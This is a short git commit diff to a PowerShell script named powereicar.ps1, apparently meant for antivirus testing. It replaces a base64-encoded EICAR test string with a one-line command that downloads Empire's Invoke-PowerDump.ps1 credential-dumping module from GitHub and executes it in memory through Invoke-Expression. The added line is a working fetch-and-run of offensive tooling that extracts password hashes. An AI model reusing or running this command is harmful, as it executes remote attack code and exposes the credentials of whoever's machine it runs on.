b3627b742057965c4ea1a3671b60c13fcdaaf72c
Feathers <93973834+ionsor@users.noreply.github.com>
2025-02-18 13:50:08 +0100

    Update powereicar.ps1
    use powerdump.ps1 instead of eicar string

--- powereicar.ps1
+++ powereicar.ps1
@@ -1,1 +1,1 @@
-Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("WDVPIVAlQEFQWzRcUFpYNTQoUCFeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIA0grSCo=")))
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/master/data/module_source/credentials/Invoke-PowerDump.ps1")
